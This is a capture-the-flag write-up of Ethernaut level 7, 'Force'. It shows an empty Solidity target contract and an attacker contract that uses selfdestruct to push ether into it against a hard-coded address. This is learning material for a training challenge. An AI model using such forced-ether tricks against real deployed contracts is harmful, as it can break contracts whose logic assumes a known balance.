# Ethernaut - Level 7 - Force

Contract code:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

Objectives:
```
The goal of this level is to make the balance of the contract greater than zero.
```

This one for me was pretty difficult at first. 

There are no functions, even fallback functions; what can I do??

Then I stumble across the concept of self-destruction of contracts.

When a contract want to self-destruct, it sends all of its ether to an address that we can specify.

This could let us force our contract to send ether to this contract.

Attacker contract:
```
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


contract Destruction {
	address payable TARGET_CONTRACT = payable(0x35174d53DeA9700DA3161f6f6a8A48b63B0FAD97);


	function goodbye() public {
		selfdestruct(TARGET_CONTRACT);
	}


	function balance() public view returns (uint) {
		return address(this).balance;
	}

	receive() external payable {
		require(msg.value > 0);
	}
}
```

We need to declare a fallback function on our contract so that we can send some ether.
